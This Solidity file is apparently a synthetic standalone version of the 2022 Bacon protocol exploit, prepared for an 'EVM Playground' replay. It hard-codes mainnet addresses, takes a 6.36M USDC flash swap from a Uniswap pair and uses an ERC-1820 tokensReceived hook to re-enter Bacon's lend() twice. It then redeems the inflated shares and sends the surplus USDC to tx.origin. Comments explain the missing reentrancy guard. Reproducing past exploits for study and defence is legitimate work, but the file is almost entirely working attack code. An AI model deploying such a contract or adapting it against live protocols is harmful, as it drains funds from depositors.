// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.7.0 <0.9.0;

// Synthetic standalone exploit for the EVM Playground (2022-03-Bacon).
//
// The DeFiHackLabs PoC (test/Bacon_exp.sol) runs the whole attack INLINE in the
// Foundry test contract `ContractTest`: the constructor registers the test as its
// own ERC-1820 `tokensReceived` implementer, `test()` kicks off a UniswapV2 flash
// swap, and the `uniswapV2Call` / `tokensReceived` callbacks — which carry the
// actual exploit logic — are defined on the test itself. There is therefore no
// standalone contract to deploy.
//
// This file is a faithful, self-contained copy of that inline attack so the
// playground can deploy it and record `run()`. Logic and constants are copied
// verbatim from test/Bacon_exp.sol:
//   - constructor registers `address(this)` as the implementer for
//     keccak256("AmplyTokensRecipient") (0xb281fc8c…).
//   - run()  → pair.swap(6_360_000_000_000, 0, address(this), bytes("0x01")).
//   - uniswapV2Call() → approve bacon, lend(2.12e12), redeem(all), repay flash,
//     then forward the surplus USDC to tx.origin.
//   - tokensReceived() → re-enter lend(2.12e12) while count <= 2 (the bug).
//
// Root cause: a CEI violation + missing reentrancy guard on Bacon's `lend()`.
// lend() pulls USDC into the pool via an ERC-1820 "tokensReceived" callback
// (USDC-via-Amply wrapper) BEFORE crediting the attacker's pool shares, so the
// attacker re-enters lend() twice inside that callback and double-counts the
// deposit, then redeem()s far more USDC than was flash-borrowed.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
    function transfer(address to, uint256 value) external returns (bool);
    function decimals() external view returns (uint8);
}

interface IUniswapV2Pair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IBacon {
    function lend(uint256 index) external;
    function redeem(uint256 index) external;
    function balanceOf(address account) external view returns (uint256);
}

interface ERC1820Registry {
    function setInterfaceImplementer(address _addr, bytes32 _interfaceHash, address _implementer) external;
}

contract BaconDrain {
    IUniswapV2Pair constant PAIR = IUniswapV2Pair(0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc); // USDC/WETH
    IERC20 constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IBacon constant BACON = IBacon(0xb8919522331C59f5C16bDfAA6A121a6E03A91F62);

    uint256 count = 0;

    constructor() {
        // Register `address(this)` as the implementer for the ERC-1820
        // `tokensReceived` hook (keccak256("AmplyTokensRecipient")). When USDC is
        // transferred INTO the bacon pool during lend(), this hook fires on us and
        // hands control back — before the lend accounting settles.
        ERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24).setInterfaceImplementer(
            address(this),
            bytes32(0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b),
            address(this)
        );
    }

    // step 0: flash-borrow 6.36M USDC from the USDC/WETH Uniswap pair. The callback
    // below must repay it (plus the 0.3% fee) before the transaction ends.
    function run() external {
        PAIR.swap(6_360_000_000_000, 0, address(this), new bytes(1));
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {
        USDC.approve(address(BACON), 10_000_000_000_000_000_000);

        // First lend() transfers USDC into the pool — the ERC-1820 tokensReceived
        // hook re-enters lend() twice more inside this call.
        BACON.lend(2_120_000_000_000);

        // Pull out far more USDC than was deposited (accounting was inflated by the
        // re-entrant lends).
        BACON.redeem(BACON.balanceOf(address(this)));

        // Repay the flash loan: amount0/997*1000 + 1e6 (the 0.3% pair fee + dust).
        USDC.transfer(msg.sender, ((amount0 / 997) * 1000) + 10 ** USDC.decimals());

        // Forward the remaining surplus to the caller (tx.origin in the on-chain
        // attack). The recorder invokes run() as `attacker`, so tx.origin == caller
        // == attacker, and the USDC profit is scored on the attacker EOA.
        USDC.transfer(tx.origin, USDC.balanceOf(address(this)));
    }

    // The reentrancy: fires during lend()'s USDC transfer (before accounting
    // settles). Re-enters lend() twice to double-count the deposit.
    function tokensReceived(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes calldata data,
        bytes calldata operatorData
    ) public {
        count += 1;
        if (count <= 2) {
            BACON.lend(2_120_000_000_000);
        }
    }
}
